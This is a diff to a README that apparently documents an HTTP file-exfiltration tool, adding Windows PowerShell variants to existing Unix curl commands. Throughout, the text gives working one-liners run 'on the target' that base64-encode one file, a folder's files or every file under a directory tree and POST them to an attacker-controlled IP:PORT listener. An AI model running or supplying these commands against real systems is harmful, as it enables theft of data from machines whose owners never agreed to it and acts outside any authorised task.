@@ -13,8 +13,9 @@ If you have an idea of adjusts, let me know! :)<br>
 ```bash
 $ python3 server.py
 ```
-4 - Now on the target, there are some ways to exfiltrate<br>
+4 - Now on the target, there are some ways to exfiltrate, based on operation system:<br>
 
+# Unix
 - Single File
 ```bash
 $ cat file.txt | base64 -w 0 | curl -XPOST 'http://IP:PORT/post' --data-binary @-
@@ -26,10 +27,26 @@ $ ls -p | grep -v / >> files_list
 $ for x in $(cat files_list); do cat $x | base64 -w 0 | curl -XPOST 'http://IP:PORT/post' --data-binary @-; done
 ```
 
-- Multiple Files on all the subfolders from the current dir
+- Multiple Files on all the subfolders from the current directory
 ```bash
 $ find ./ -type f >> files_list
 $ for x in $(cat files_list); do cat $x | base64 -w 0 | curl -XPOST 'http://IP:PORT/post' --data-binary @-; done
+```
+
+# Windows
+- Single File
+```powershell
+powershell -c "$EncodedBase64 = [convert]::ToBase64String((Get-Content -path '.\sensitive_file.txt' -Encoding byte)); Invoke-WebRequest -Uri 'http://IP:PORT/post' -Method Post -Body $EncodedBase64"
+```
+
+- Multiple Files on the same folder
+```powershell
+powershell -c "$files = Get-ChildItem -File -Name; ForEach ($file in $files) {$EncodedBase64 = [convert]::ToBase64String((Get-Content -path $file -Encoding byte)); Invoke-WebRequest -Uri 'http://IP:PORT/post' -Method Post -Body $EncodedBase64}"
+```
+
+- Multiple Files on all the subfolders from the current directory
+```powershell
+powershell -c "$files = Get-ChildItem -File -Name -Recurse; ForEach ($file in $files) {$EncodedBase64 = [convert]::ToBase64String((Get-Content -path $file -Encoding byte)); Invoke-WebRequest -Uri 'http://IP:PORT/post' -Method Post -Body $EncodedBase64}"
 ```
 
 # Requirements
@@ -38,3 +55,4 @@ Since we are talking of an HTTP Exfiltration, we should meet some requirements f
 - Free access to the internet
 - No proxy (Some of them, may block)
 - Curl installed
+- Powershell acessible
